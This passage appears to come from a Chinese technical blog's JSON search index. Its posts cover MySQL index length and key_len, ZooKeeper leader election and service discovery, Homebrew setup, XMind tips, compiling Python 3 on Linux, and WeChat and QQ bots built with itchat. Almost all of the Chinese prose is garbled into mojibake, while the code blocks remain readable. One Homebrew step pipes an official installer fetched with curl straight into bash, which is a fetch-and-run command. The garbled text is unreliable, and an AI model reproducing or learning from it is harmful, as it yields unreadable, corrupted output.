ç”¨ç©ºé—´\n\nå¤åˆç´¢å¼•(a,b,c)å’Œå•åˆ—ç´¢å¼•(a)åœ¨æŸ¥è¯¢æ¡ä»¶ä¸­åªæœ‰aå­—æ®µæ—¶éƒ½ä¼šè¢«è°ƒç”¨,ä½†æ˜¯å­˜åœ¨è¾ƒå°çš„æ€§èƒ½å·®å¼‚.ä¸»è¦æ€§èƒ½å·®å¼‚å–å†³äºIOæ€§èƒ½. \n\nå› ä¸ºç´¢å¼•å®è´¨ä¸Šå°±æ˜¯å°†è¯¥æ¡è®°å½•çš„å”¯ä¸€æ ‡è¯†rowidå’Œç´¢å¼•å­—æ®µè®°å½•ä¸‹æ¥.æ‰€ä»¥ä¸€ä¸ªæœ€å°çš„å­˜å‚¨ç‰©ç†å—blockå­˜å‚¨å•åˆ—ç´¢å¼•(a)å¯èƒ½å¯ä»¥å­˜å‚¨100æ¡æ•°æ®,è€Œå¤åˆç´¢å¼•(a,b,c)å¯èƒ½åªèƒ½å­˜å‚¨30æ¡,é‚£ä¹ˆåœ¨ä½¿ç”¨ç´¢å¼•æ—¶,å¤åˆç´¢å¼•éœ€è¦IOåˆ°çš„blockæ›´å¤š,è‡ªç„¶å°±ä¼šå­˜åœ¨æ€§èƒ½å·®å¼‚.\n\nä½†æ˜¯åœ¨è¡¨ç©ºé—´çš„ä½¿ç”¨ä¸Š,å¤åˆç´¢å¼•çš„å ç”¨ç©ºé—´å¹¶ä¸ç­‰äºæ‰€æ¶‰åŠåˆ°çš„åˆ—çš„æ‰€æœ‰å•åˆ—ç´¢å¼•çš„æ€»å’Œ,è€Œæ˜¯è¿œè¿œå°äº,ç»å®æµ‹4ä¸ªå­—æ®µçš„å¤åˆç´¢å¼•å ç”¨ç©ºé—´ä¸º3072KB,è€Œ4ä¸ªå•åˆ—ç´¢å¼•å ç”¨çš„ç©ºé—´å‡ä¸º2048KB,å³4ä¸ªå•åˆ—ç´¢å¼•æ€»å’Œä¸º8192KB.ä¸»è¦åŸå› æ˜¯æ¯ä¸ªç´¢å¼•ä¸­éƒ½å¿…é¡»åŒ…å«rowid,è€Œrowidæ˜¯æ¯”è¾ƒå¤§çš„,é€šå¸¸æƒ…å†µä¸‹å ç”¨ç©ºé—´è¿œå¤§äºæ•°æ®.\n\n\n\n# 3. å…¶ä»–\n\n### 3.1 æŸ¥çœ‹ sql æ‰§è¡Œæ—¶é—´\n\n```bash\nset profiling = 1;\nshow profiles;\n```\n\n### 3.2 ç´¢å¼•é•¿åº¦\n\nå¯¹äºmyisamå’Œinnodbå­˜å‚¨å¼•æ“ï¼Œprefixesçš„é•¿åº¦é™åˆ¶åˆ†åˆ«ä¸º1000 byteså’Œ767 bytesã€‚æ³¨æ„prefixçš„å•ä½æ˜¯bytesï¼Œä½†æ˜¯å»ºè¡¨æ—¶æˆ‘ä»¬æŒ‡å®šçš„é•¿åº¦å•ä½æ˜¯å­—ç¬¦ã€‚ \n\nä»¥utf8å­—ç¬¦é›†ä¸ºä¾‹ï¼Œä¸€ä¸ªå­—ç¬¦å 3ä¸ªbytesã€‚å› æ­¤åœ¨utf8å­—ç¬¦é›†ä¸‹ï¼Œå¯¹myisamå’Œinnodbå­˜å‚¨å¼•æ“åˆ›å»ºç´¢å¼•çš„å•åˆ—é•¿åº¦ä¸èƒ½è¶…è¿‡333ä¸ªå­—ç¬¦å’Œ255ä¸ªå­—ç¬¦ã€‚ \n\nsmallint å 2ä¸ªbytesï¼Œtimestampå 4ä¸ªbytesï¼Œutf8å­—ç¬¦é›†ã€‚utf8å­—ç¬¦é›†ä¸‹ï¼Œä¸€ä¸ªcharacterå 3ä¸ªbytesã€‚ \n\n### 3.3 key_len\n\nå®Œå…¨åŒ¹é…, å°±æ˜¯ key_len æ˜¯æ»¡çš„, ä¸å®Œå…¨åŒ¹é…, ä¾‹å¦‚å‰é¢, key_len å°±æ˜¯å°‘çš„\n\nä¾‹å¦‚: (user_id, award_id, lottery_id)  å¤åˆç´¢å¼•, ä¸€å…±æ˜¯12\n\n```sql\nexplain SELECT * FROM `lottery_user_log` WHERE (user_id=279223)  --key_len:4\n\nexplain SELECT * FROM `lottery_user_log` WHERE (user_id=279223 and award_id = 8)  --key_len:8\n\nexplain SELECT * FROM `lottery_user_log` WHERE (user_id=279223 and award_id = 8 and lottery_id=1) --key_len:12\n```\n\n\n\n### 3.4 ä¸æ»¡è¶³æœ€å·¦åŒ¹é…, ä¹Ÿç”¨äº†ç´¢å¼•\n\n> å°±æ˜¯  possible_keys is null but key isn't null\n\nkeyå¯èƒ½æœ‰ä¸€ä¸ªä¸å­˜åœ¨äºpossible_keyså€¼ä¸­çš„ç´¢å¼•ã€‚\n\nå¦‚æœæ‰€æœ‰å¯èƒ½çš„ç´¢å¼•éƒ½ä¸é€‚åˆæŸ¥æ‰¾è¡Œï¼Œä½†æŸ¥è¯¢é€‰æ‹©çš„æ‰€æœ‰åˆ—éƒ½æ˜¯å…¶ä»–ç´¢å¼•çš„åˆ—ï¼Œåˆ™ä¼šå‘ç”Ÿè¿™ç§æƒ…å†µã€‚\n\nä¹Ÿå°±æ˜¯è¯´ï¼Œå‘½åç´¢å¼•è¦†ç›–é€‰å®šçš„åˆ—å°½ç®¡å®ƒä¸ç”¨äºç¡®å®šè¦æ£€ç´¢çš„è¡Œï¼Œä½†ç´¢å¼•æ‰«ææ¯”æ•°æ®è¡Œæ‰«ææ›´æœ‰æ•ˆã€‚\n\nhttps://dev.mysql.com/doc/refman/5.7/en/explain-output.html#explain_key\n\n\n\n# 4. å¤´è„‘é£æš´\n\n+ order by æœ€å¥½å’Œ where ç”¨åŒä¸€ä¸ªå­—æ®µ, èƒ½æœ‰æ•ˆé¿å… Using filesort\n+ å°½é‡çš„æ‰©å±•ç´¢å¼•ï¼Œä¸è¦æ–°å»ºç´¢å¼•ã€‚æ¯”å¦‚è¡¨ä¸­å·²ç»æœ‰açš„ç´¢å¼•ï¼Œç°åœ¨è¦åŠ (a,b)çš„ç´¢å¼•ï¼Œé‚£ä¹ˆåªéœ€è¦ä¿®æ”¹åŸæ¥çš„ç´¢å¼•å³å¯ã€‚\n\n# 5. å‚è€ƒèµ„æ–™\n\n+ https://dev.mysql.com/doc/refman/8.0/en/explain-output.html\n+ https://blog.souche.com/mysql-explain/\n+ https://segmentfault.com/a/1190000008131735","tags":["mysql"],"categories":["mysql"]},{"title":"zookeeperçš„åŸç†å’Œä½¿ç”¨åœºæ™¯","url":"%2Fp%2F7c519e18.html","content":"\n\n# 1. åˆ†å¸ƒå¼åº”ç”¨\n\n### 1.1 ä¸€è‡´æ€§\n\nå¼ºä¸€è‡´æ€§\n\nå¼±ä¸€è‡´æ€§\n\næœ€ç»ˆä¸€è‡´æ€§\n\n<!-- more -->\n\n### 1.2 é€‰ä¸¾Leader\n\nå…ˆçœ‹ zid (å†™çš„ä¸€ä¸ªæ—¥å¿— id),  å†çœ‹ myid\n\né€‰å– Leader æ—¶é—´èŠ‚ç‚¹\n\n+ æœåŠ¡åˆšå¯åŠ¨\n\n+ leader æŒ‚äº†\n\n+ è¶…è¿‡ä¸€åŠçš„èŠ‚ç‚¹æŒ‚äº†ï¼Œ leader shutdown\n\n### 1.3 åŒæ­¥æ“ä½œ\n\nleader è´Ÿè´£å†™\n\nfollower è½¬å‘ç»™ leader å†™\n\n+ leader ç”Ÿæˆæ—¥å¿—ï¼Œå‘ç»™æ‰€æœ‰ follower\n\n+ follewer æŒä¹…åŒ–æ—¥å¿—ï¼Œ å›å¤ ack\n\n+ leader æ¥æ”¶è¶…è¿‡ä¸€åŠ ack, å‘é€commit,  æ›´æ–° database\n\n+ folleweræ”¶åˆ° commit, æ›´æ–° database\n\n\n\n# 2. zookeeper\n\n### 2.1 znode\n\n+ path å”¯ä¸€è·¯å¾„\n\n+ data æ•°æ®, å¯ä»¥æ²¡æœ‰\n\n+ childNode å­èŠ‚ç‚¹\n\n+ stat çŠ¶æ€å±æ€§\n\n+ type èŠ‚ç‚¹ç±»å‹\n\n  + æŒä¹…èŠ‚ç‚¹ï¼ˆé™¤éæ‰‹åŠ¨åˆ é™¤ï¼ŒèŠ‚ç‚¹æ°¸è¿œå­˜åœ¨, é»˜è®¤çš„ï¼‰\n  + æŒä¹…æœ‰åºèŠ‚ç‚¹ï¼ˆæŒ‰ç…§åˆ›å»ºé¡ºåºä¼šä¸ºæ¯ä¸ªèŠ‚ç‚¹æœ«å°¾å¸¦ä¸Šä¸€ä¸ªåºå·å¦‚ï¼šroot-1ï¼‰\n  + ä¸´æ—¶èŠ‚ç‚¹ï¼ˆåˆ›å»ºå®¢æˆ·ç«¯ä¸ Zookeeper ä¿æŒè¿æ¥æ—¶èŠ‚ç‚¹å­˜åœ¨ï¼Œæ–­å¼€æ—¶åˆ™åˆ é™¤å¹¶ä¼šæœ‰ç›¸åº”çš„é€šçŸ¥ï¼‰\n    + ä¸èƒ½æ‹¥æœ‰å­èŠ‚ç‚¹\n    + æœåŠ¡æ³¨å†Œ\n    + åˆ†å¸ƒå¼é”\n  + ä¸´æ—¶æœ‰åºèŠ‚ç‚¹ï¼ˆåœ¨ç¬æ—¶èŠ‚ç‚¹çš„åŸºç¡€ä¸ŠåŠ ä¸Šäº†é¡ºåºï¼‰\n\n  \n\n# 3. å®‰è£…å’Œä½¿ç”¨\n\n### 3.1 å®‰è£…\n\n```bash\nbrew install zookeeper\n```\n\nå®‰è£…å®Œæˆï¼Œé…ç½®æ–‡ä»¶åœ¨ `/usr/local/etc/zookeeper/` \n\n### 3.2 ä½¿ç”¨\n\n```bash\nzkServer start #å¯åŠ¨ zookeeper\nzkCli # è¿æ¥ zookeeper\n\nls /\ncreate /apps \"test\"\nget -s /apps\n\ncreate -s # åºå·\ncreate -e # ä¸´æ—¶\n```\n\n\n\n# 4. åˆ†å¸ƒå¼é”\né€šè¿‡ä¸´æ—¶å’Œåºå·çš„åŸç†\n+ åˆ›å»ºä¸´æ—¶åºå·èŠ‚ç‚¹\n+ è·å–æœ€å°çš„èŠ‚ç‚¹æ˜¯å¦æ—¶è¯»é”, å¦‚æœæ˜¯è¯», é‚£ä¹ˆè·å¾—é”\n+ å¦‚æœä¸æ˜¯, é˜»å¡ç­‰å¾…, æ·»åŠ å­èŠ‚ç‚¹å˜æ›´ç›‘å¬(å¯ä»¥æ”¹è¿›é“¾è¡¨, ç›‘å¬å®ƒçš„ä¸Šä¸€ä¸ªèŠ‚ç‚¹)\n\n\n\n# 5. æœåŠ¡æ³¨å†Œå’Œå‘ç°\n\n### 5.1 æœåŠ¡æ³¨å†Œ\n\næœåŠ¡æä¾›è€…ï¼ˆProviderï¼‰å¯åŠ¨æ—¶ï¼Œä¼šå‘ZookeeperæœåŠ¡ç«¯æ³¨å†ŒæœåŠ¡ä¿¡æ¯ï¼Œå³ä¼šåœ¨ZookeeperæœåŠ¡å™¨ä¸Šåˆ›å»ºä¸€ä¸ªæœåŠ¡èŠ‚ç‚¹(ä¸´æ—¶èŠ‚ç‚¹)ï¼Œå¹¶åœ¨èŠ‚ç‚¹ä¸Šå­˜å‚¨æœåŠ¡çš„ç›¸å…³æ•°æ®ï¼ˆå¦‚æœåŠ¡æä¾›è€…çš„ipåœ°å€ã€ç«¯å£ç­‰ï¼‰ï¼Œæ¯”å¦‚æ³¨å†Œä¸€ä¸ªç”¨æˆ·æ³¨å†ŒæœåŠ¡ï¼ˆuser/registerï¼‰ã€‚\n\n### 5.2 æœåŠ¡å‘ç°\n\næœåŠ¡æ¶ˆè´¹è€…ï¼ˆConsumerï¼‰å¯åŠ¨æ—¶ï¼Œä¼šæ ¹æ®æœ¬èº«ä¾èµ–çš„æœåŠ¡ä¿¡æ¯ï¼Œå‘ZookeeperæœåŠ¡ç«¯è·å–æ³¨å†Œçš„æœåŠ¡ä¿¡æ¯å¹¶è®¾ç½®Watchï¼Œè·å–åˆ°æ³¨å†Œçš„æœåŠ¡ä¿¡æ¯ä¹‹åå°†æœåŠ¡æä¾›è€…ä¿¡æ¯ç¼“å­˜åœ¨æœ¬åœ°ï¼Œè°ƒç”¨æœåŠ¡æ—¶ç›´æ¥æ ¹æ®ä»Zookeeperæ³¨å†Œä¸­å¿ƒè·å–åˆ°çš„æœåŠ¡æ³¨å†Œä¿¡æ¯è°ƒç”¨æœåŠ¡ï¼Œæ¯”å¦‚å‘ç°ç”¨æˆ·æ³¨å†ŒæœåŠ¡ï¼ˆuser/registerï¼‰å¹¶è°ƒç”¨ã€‚\n\n### 5.3 æœåŠ¡é€šçŸ¥\n\nå½“æœåŠ¡æä¾›è€…å› ä¸ºæŸç§åŸå› å®•æœºæˆ–ä¸æä¾›æœåŠ¡ä¹‹åï¼ŒZookeeperæœåŠ¡æ³¨å†Œä¸­å¿ƒçš„å¯¹åº”æœåŠ¡èŠ‚ç‚¹ä¼šè¢«åˆ é™¤ï¼Œå› ä¸ºæ¶ˆè´¹è€…åœ¨è·å–æœåŠ¡ä¿¡æ¯çš„æ—¶å€™åœ¨å¯¹åº”èŠ‚ç‚¹ä¸Šè®¾ç½®äº†Watchï¼Œå› æ­¤èŠ‚ç‚¹åˆ é™¤ä¹‹åä¼šè§¦å‘å¯¹åº”çš„Watcherï¼ŒZookeeperæ³¨å†Œä¸­å¿ƒä¼šå¼‚æ­¥å‘æœåŠ¡æ‰€å…³è”çš„æ‰€æœ‰æœåŠ¡æ¶ˆè´¹è€…å‘å‡ºèŠ‚ç‚¹åˆ é™¤çš„é€šçŸ¥ï¼ŒæœåŠ¡æ¶ˆè´¹è€…æ ¹æ®æ”¶åˆ°çš„é€šçŸ¥æ›´æ–°ç¼“å­˜çš„æœåŠ¡åˆ—è¡¨ã€‚\n\n### 5.4 æ€»ç»“\n\n+ æ³¨å†Œä½¿ç”¨ä¸´æ—¶èŠ‚ç‚¹, ä¿å­˜ ip å’Œç«¯å£, å°±ç®—æŒ‚äº†èŠ‚ç‚¹ä¹Ÿèƒ½é‡Šæ”¾\n+ æ¶ˆè´¹è€…ç›‘å¬çˆ¶èŠ‚ç‚¹, æœåŠ¡å˜æ¢å°±ä¼šæ”¶åˆ°é€šçŸ¥\n+ æ ¹æ®åˆ—è¡¨ä¸­çš„ä¸€ç³»åˆ—æœåŠ¡, å¯ä»¥éšæœºç®—æ³•å®ç°è°ƒç”¨, ç›¸å½“äºè´Ÿè½½å‡è¡¡","tags":["zookeeper"],"categories":["åˆ†å¸ƒå¼"]},{"title":"macçš„homebrewä½¿ç”¨","url":"%2Fp%2Fbe2ea1c8.html","content":"\nHomebrewæ˜¯ä¸€æ¬¾Mac OSå¹³å°ä¸‹çš„è½¯ä»¶åŒ…ç®¡ç†å·¥å…·ï¼Œæ‹¥æœ‰å®‰è£…ã€å¸è½½ã€æ›´æ–°ã€æŸ¥çœ‹ã€æœç´¢ç­‰å¾ˆå¤šå®ç”¨çš„åŠŸèƒ½ã€‚ç®€å•çš„ä¸€æ¡æŒ‡ä»¤ï¼Œå°±å¯ä»¥å®ç°åŒ…ç®¡ç†ï¼Œè€Œä¸ç”¨ä½ å…³å¿ƒå„ç§ä¾èµ–å’Œæ–‡ä»¶è·¯å¾„çš„æƒ…å†µï¼Œååˆ†æ–¹ä¾¿å¿«æ·ã€‚\n\n<!-- more -->\n\nHomebrew ä¼šå°†è½¯ä»¶åŒ…å®‰è£…åˆ°ç‹¬ç«‹ç›®å½•ï¼Œå¹¶å°†å…¶æ–‡ä»¶è½¯é“¾æ¥è‡³ /usr/local ã€‚\n\n```bash\ncd /usr/local\nfind Cellar\nCellar/wget/1.16.1\nCellar/wget/1.16.1/bin/wget\nCellar/wget/1.16.1/share/man/man1/wget.1\n\n$ ls -l bin\nbin/wget -> ../Cellar/wget/1.16.1/bin/wget\n```\n\n\n\n# 1. å®‰è£…ä½¿ç”¨\n\nå»å®˜ç½‘ https://brew.sh/ çœ‹æœ€æ–°ä¸‹è½½ä¿¡æ¯:\n\n```bash\n/bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install.sh)\"\n```\n\nå¸¸ä½¿ç”¨å‘½ä»¤\n\n```bash\nbrew --version æˆ–è€… brew -v # æ˜¾ç¤ºbrewç‰ˆæœ¬ä¿¡æ¯\n\nbrew list   #æ˜¾ç¤ºæ‰€æœ‰çš„å·²å®‰è£…çš„è½¯ä»¶\nbrew update #è‡ªåŠ¨å‡çº§homebrew\nbrew upgrade  #å‡çº§æ‰€æœ‰å·²è¿‡æ—¶çš„è½¯ä»¶ï¼Œå³åˆ—å‡ºçš„ä»¥è¿‡æ—¶è½¯ä»¶\nbrew upgrade <formula> #å‡çº§æŒ‡å®šçš„è½¯ä»¶\n```\n\n\n\n# 2. æŸ¥çœ‹æºæ›´æ”¹æº\n\nå¯¹äº homebrewï¼Œéœ€è¦æ›¿æ¢çš„æ˜¯4ä¸ªæ¨¡å—çš„é•œåƒ\n\n+ Homebrewï¼ˆbrew --repoï¼‰\n\n+ Homebrew Coreï¼ˆbrew --repo homebrew/coreï¼‰\n\n+ Homebrew Caskï¼ˆbrew --repo homebrew/caskï¼‰\n\n+ Homebrew-bottles\n\næ›¿æ¢: \n\n```bash\n#æ›¿æ¢ Homebrew\ngit -C \"$(brew --repo)\" remote set-url origin https://mirrors.ustc.edu.cn/brew.git\n\n#æ›¿æ¢ Homebrew Core\ngit -C \"$(brew --repo homebrew/core)\" remote set-url origin https://mirrors.ustc.edu.cn/homebrew-core.git\n\n#æ›¿æ¢ Homebrew Cask\ngit -C \"$(brew --repo homebrew/cask)\" remote set-url origin https://mirrors.ustc.edu.cn/homebrew-cask.git\n\n#æ›¿æ¢ Homebrew-bottles\necho 'export HOMEBREW_BOTTLE_DOMAIN=https://mirrors.ustc.edu.cn/homebrew-bottles' >> ~/.zshrc\nsource ~/.zshrc\n\n# æ›´æ–°\nbrew update\n```\n\n\n\n# 3. å‚è€ƒèµ„æ–™\n\n+ https://brew.sh/\n+ https://www.zhihu.com/question/31360766/answer/749386652","tags":["mac"],"categories":["è½¯ä»¶"]},{"title":"xmind_zenæ€ç»´å¯¼å›¾ä½¿ç”¨æ•™ç¨‹","url":"%2Fp%2F2c700d35.html","content":"\n# 1. ä»‹ç»\n\næœ‰æ—¶å€™æˆ‘ä»¬æ—¶å¸¸è§‰å¾—å¤´è„‘è¿·æƒ‘ï¼Œè®¸å¤šäº‹æƒ…æƒ³ä¸é€å½»ï¼Œæˆ‘æƒ³è¿™åº”è¯¥å°±æ˜¯æ¬ ç¼ºé€»è¾‘æ€ç»´çš„ä½“ç°ï¼Œå¦‚æœä½ å’Œæˆ‘ä¸€æ ·ï¼Œæœªæ›¾ç»å—ç³»ç»Ÿçš„æ€ç»´è®­ç»ƒï¼Œé‚£ä¹ˆä¸å¦¨å…ˆä»ä½¿ç”¨Xmindå¼€å§‹ï¼ŒåšæŒä¸‹å»ï¼Œä¸æ–­ä¼˜åŒ–ï¼Œæœ€åä¸€å®šèƒ½æœ‰æ‰€æ”¶è·ã€‚\n\n<!-- more -->\n\n# 2. ä½¿ç”¨\n\n### 2.1 åŸºç¡€ä½¿ç”¨\n\n+ ç¼–è¾‘ä¸»é¢˜æ–‡å­—ï¼šæŒ‰ã€ç©ºæ ¼é”®**ã€‘**å°±å¯ä»¥è¿›è¡Œå†…å®¹çš„è¾“å…¥\n+ æ·»åŠ åŒçº§ä¸»é¢˜ï¼šå¿«æ·é”®**ã€**enter/return**ã€‘**å¿«é€Ÿè¿›è¡Œæ·»åŠ \n+ æ·»åŠ å­ä¸»é¢˜ï¼šç”¨å¿«æ·é”®ã€tabã€‘\n\n+ åˆ é™¤ï¼šé€‰ä¸­ä¸»é¢˜æŒ‰ã€deleteã€‘\n\n+ å›¾æ ‡  ctrl+[\n+ æ ·å¼  ctrl+]\n\n### 2.2 å°æŠ€å·§\n\n+ æ ¼å¼->æ ·å¼   å¼€å¯å½©è™¹åˆ†æ”¯\n+ æ ¼å¼->æ ·å¼  å¼€å¯çº¿æ¡æ¸ç»†\n+ æ ¼å¼->ç”»å¸ƒ  å¼€å¯è‡ªåŠ¨å¹³è¡¡å¸ƒå±€\n\n\n\n# 3. å‚è€ƒé“¾æ¥\n\n+ https://www.zhihu.com/question/20381369/answer/187568292\n+ https://www.xmind.cn/blog/cn/useful-tips-for-xmind-2020/","tags":["xmind"],"categories":["ä½¿ç”¨è½¯ä»¶"]},{"title":"linuxæºç å®‰è£…python3","url":"%2Fp%2F95e70f76.html","content":"\n\n\nlinuxä¸‹å¤§éƒ¨åˆ†ç³»ç»Ÿé»˜è®¤è‡ªå¸¦python2.xçš„ç‰ˆæœ¬. é»˜è®¤çš„pythonè¢«ç³»ç»Ÿå¾ˆå¤šç¨‹åºæ‰€ä¾èµ–ï¼Œæ¯”å¦‚centosä¸‹çš„yumå°±æ˜¯python2å†™çš„ï¼Œæ‰€ä»¥é»˜è®¤ç‰ˆæœ¬ä¸è¦è½»æ˜“åˆ é™¤ï¼Œå¦åˆ™ä¼šæœ‰ä¸€äº›é—®é¢˜.\n\nå¦‚æœéœ€è¦ä½¿ç”¨æœ€æ–°çš„Python3é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ç¼–è¯‘å®‰è£…æºç åŒ…åˆ°ç‹¬ç«‹ç›®å½•ï¼Œè¿™å’Œç³»ç»Ÿé»˜è®¤ç¯å¢ƒä¹‹é—´æ˜¯æ²¡æœ‰ä»»ä½•å½±å“çš„ï¼Œpython3å’Œpython2ä¸¤ä¸ªç¯å¢ƒå¹¶å­˜å³å¯\n\nä½œä¸ºä½œæ­»å°èƒ½æ‰‹, ä¸è£…æœ€æ–°ç‰ˆæœ¬æ€ä¹ˆèƒ½è¡Œ? æ‰€ä»¥æ‰‹åŠ¨ç¼–è¯‘python3æºç è¿›è¡Œå®‰è£…, å¹¶è®°å½•é‡åˆ°çš„ä¸€äº›é—®é¢˜.\n\n<!-- more -->\n\n\n\n### 1. ä¸‹è½½æºç :\n\nhttps://www.python.org/downloads/source/\n\næ‰¾åˆ°æœ€æ–°çš„Source release ä¸‹è½½å³å¯\n\n\n\n### 2. å®‰è£…å‡†å¤‡å·¥ä½œ:\n\näº‹å®è¯æ˜ä¸‹é¢çš„è¿™äº›è½¯ä»¶ä¸å®‰è£…, åœ¨ç¼–è¯‘python3æ—¶ä¼šå‡ºç°å„ç§é—®é¢˜, æ‰€ä»¥å…ˆæŠŠè¿™äº›è½¯ä»¶éƒ½å®‰è£…äº†.\n\n```shell\nyum install gcc  \n\nyum install zlib* # æ³¨æ„æ­¤å¤„å¸¦*, å› ä¸ºéœ€è¦ zlib-devel\n\nyum install libffi-devel # ä¸å®‰è£…æŠ¥é”™ModuleNotFoundError: No module named '_ctypes'\n\nyum install openss openssl-devel # ä¸å®‰è£…ä¼šå¯¼è‡´pip3ç¼ºå°‘ssl, æ— æ³•ä¸‹è½½åŒ…\n\n```\n\n\n\n### 3. æºç å®‰è£…python3.7\n\n```shell\nwget https://www.python.org/ftp/python/3.7.3/Python-3.7.3.tgz  # ä¸‹è½½æºç \n\ntar -zxvf Python-3.7.3.tgz\n\ncd Python-3.7.3\n\n./configure --with-ssl --with-ensurepip=install # --with-ensurepip=installæ˜¯å®‰è£…pip3 --with-sslæ˜¯è®©pip3æ”¯æŒssl\n\nmake \n\nmake altinstall # æ³¨æ„æ­¤å¤„æ˜¯altinstall, å¦‚æœæ˜¯install, ä¼šå’Œpython2é€ æˆå†²çª\n```\n\n\n\n### 4. å»ºç«‹pythonè½¯é“¾æ¥\n\nå®‰è£…æˆåŠŸå, æ‰§è¡Œç¨‹åºä¸ºpython3.7, æˆ‘ä»¬ä¸ºäº†æ–¹ä¾¿ä½¿ç”¨éœ€è¦å»ºç«‹ä¸€ä¸ªè½¯é“¾æ¥\n\n```shell\nwhich python3.7\n/usr/local/bin/python3.7\n\n\nln -s /usr/local/bin/python3.7 /usr/local/bin/python3\nln -s /usr/local/bin/pip3.7 /usr/local/bin/pip3\n```\n\n","tags":["linux"],"categories":["python"]},{"title":"å¾®ä¿¡æœºå™¨äººitchatçš„ä½¿ç”¨","url":"%2Fp%2F4f93001b.html","content":"\n\n\nè¿‘æœŸå‡†å¤‡ç”¨å¾®ä¿¡æœºå™¨äººå®ç°å¾€å¾®ä¿¡ç¾¤é‡Œå‘æ¶ˆæ¯. éœ€è¦ç”¨åˆ°å¾®ä¿¡æœºå™¨äºº.\n\nç›®å‰çš„å¾®ä¿¡æœºå™¨äººå¤§éƒ¨åˆ†éƒ½æ˜¯åŸºäºwebå¾®ä¿¡åè®®, å› æ­¤ä»…èƒ½è¦†ç›– Web å¾®ä¿¡æœ¬èº«æ‰€å…·å¤‡çš„åŠŸèƒ½ã€‚ä¾‹å¦‚æ”¶å‘æ¶ˆæ¯, åŠ å¥½å‹, è½¬å‘æ¶ˆæ¯, è‡ªåŠ¨å›å¤, é™ªäººèŠå¤©,æ¶ˆæ¯é˜²æ’¤å›ç­‰ç­‰.\n\nä½†æ˜¯webå¾®ä¿¡ç›®å‰ä¸æ”¯æŒæŠ¢çº¢åŒ…å’Œæœ‹å‹åœˆç­‰ç›¸å…³åŠŸèƒ½, å¹¶ä¸”ä½¿ç”¨æœºå™¨äººå­˜åœ¨ä¸€å®šæ¦‚ç‡è¢«é™åˆ¶ç™»å½•çš„å¯èƒ½æ€§, ä¸»è¦è¡¨ç°ä¸ºæ— æ³•ç™»é™† Web å¾®ä¿¡ (ä½†ä¸å½±å“æ‰‹æœºç­‰å…¶ä»–å¹³å°)ã€‚\n\n<!-- more -->\n\n\n\n### 1. å®‰è£…ä½¿ç”¨\n\n+ å¯å‚è€ƒ: https://github.com/littlecodersh/ItChat\n\n```shell\npip3 install itchat\n```\n\n\n\n+ ç™»å½•å¾®ä¿¡å¹¶ä¸”å‘æ–‡ä»¶åŠ©æ‰‹å‘é€ä¸€æ¡æ¶ˆæ¯\n\n```python\nimport itchat\n\nitchat.auto_login()\n\nitchat.send('Hello, filehelper', toUserName='filehelper')\n```\n\n\n\n+ æ›´å¤šä¾‹å­å¯ä»¥å‚è€ƒå®˜æ–¹æ–‡æ¡£ https://itchat.readthedocs.io/zh/latest/\n\n\n\n### 2. å‘é€æ¶ˆæ¯åˆ°å¾®ä¿¡ç¾¤\n\nå‘é€æ¶ˆæ¯åˆ°å¾®ä¿¡ç¾¤, é¦–å…ˆè¦ä¿è¯å¾®ä¿¡ç¾¤ä¿å­˜åœ¨é€šè®¯å½•, å¦‚æœä¸ä¿å­˜åˆ°é€šè®¯å½•ï¼Œæ˜¯æ— æ³•åœ¨å„è®¾å¤‡ä¹‹é—´åŒæ­¥çš„ï¼ˆæ‰€ä»¥itchatä¹Ÿæ— æ³•è¯»å–åˆ°ï¼‰\n\n```python\n# coding=utf8\nimport itchat\n\n\ndef send_group(group, msg):\n    rooms = itchat.get_chatrooms(update=True)\n    rooms = itchat.search_chatrooms(name=group)\n    if not rooms:\n        print(\"None group found\")\n    else:\n        itchat.send(msg, toUserName=rooms[0][\"UserName\"])\n\n\nif __name__ == \"__main__\":\n    itchat.auto_login(hotReload=True)\n    send_group(u\"ä½ çš„ç¾¤èŠåå­—\", \"test msg\")\n    itchat.run()\n\n```\n\n\n\n\n\n### 3. æœºå™¨äººAIèŠå¤©\n\n```python\n# coding=utf8\nimport itchat\nimport requests\n\nKEY = 'xxxxxxxx' #å¯ä»¥å»http://www.turingapi.com/ç”³è¯·\n\n\ndef get_response(msg):\n    apiUrl = 'http://www.tuling123.com/openapi/api'\n    data = {\n        'key': KEY,\n        'info': msg,\n        'userid': 'wechat-robot',\n    }\n    try:\n        r = requests.post(apiUrl, data=data).json()\n        return r.get('text')\n    except:\n        return\n\n\n@itchat.msg_register(itchat.content.TEXT)\ndef tuling_reply(msg):\n    defaultReply = 'I received: ' + msg['Text']\n    reply = get_response(msg['Text'])\n    return reply or defaultReply\n\n\nitchat.auto_login(hotReload=True)\nitchat.run()\n```\n\n\n\n### 4. æ¶ˆæ¯é˜²æ’¤å›\n\nå¯å‚è€ƒä¸‹é¢çš„è¿™ä¸ªé¡¹ç›®\n\nhttps://github.com/ccding/wechat-anti-revoke \n\n\n\n### 5. å…¶ä»–å¾®ä¿¡æœºå™¨äººé¡¹ç›®\n\n+ https://github.com/youfou/wxpy   åœ¨ itchat çš„åŸºç¡€ä¸Šï¼Œé€šè¿‡å¤§é‡æ¥å£ä¼˜åŒ–æå‡äº†æ¨¡å—çš„æ˜“ç”¨æ€§ï¼Œå¹¶è¿›è¡Œä¸°å¯Œçš„åŠŸèƒ½æ‰©å±•\n+ https://github.com/lb2281075105/Python-WeChat-ItChat ä½¿ç”¨itchatçš„ä¸€äº›demo\n+ https://github.com/littlecodersh/itchatmp å¾®ä¿¡å…¬ä¼—å·ã€ä¼ä¸šå·æ¥å£é¡¹ç›®\n+ https://github.com/newflydd/itchat4go golangç‰ˆæœ¬å°è£…çš„itchat\n\n\n\n","tags":["wechat"],"categories":["çˆ¬è™«"]},{"title":"qqæœºå™¨äººé…·qçš„ä½¿ç”¨","url":"%2Fp%2F545a4e78.html","content":"\n\n\nè¿‘æœŸå‡†å¤‡ç”¨qqæœºå™¨äººå®ç°å¾€qqç¾¤é‡Œå‘æ¶ˆæ¯. éœ€è¦ç”¨åˆ°qqæœºå™¨äºº.\n\næ®è¯´åœ¨2019å¹´å‰, ç”¨qqæœºå™¨äººæ˜¯éå¸¸ä¹‹æ–¹ä¾¿. ä½†æ˜¯è‡ªä»Smart QQ åè®®åœ¨ 2019 å¹´ 1 æœˆ 1 æ—¥åœæ­¢æœåŠ¡å, ç½‘ä¸Šå¥½å¤šqqæœºå™¨äººé¡¹ç›®éƒ½å¤±æ•ˆäº†.\n\nç›®å‰æ‰¾åˆ°äº†ä¸€æ¬¾é…·Qæœºå™¨äºº 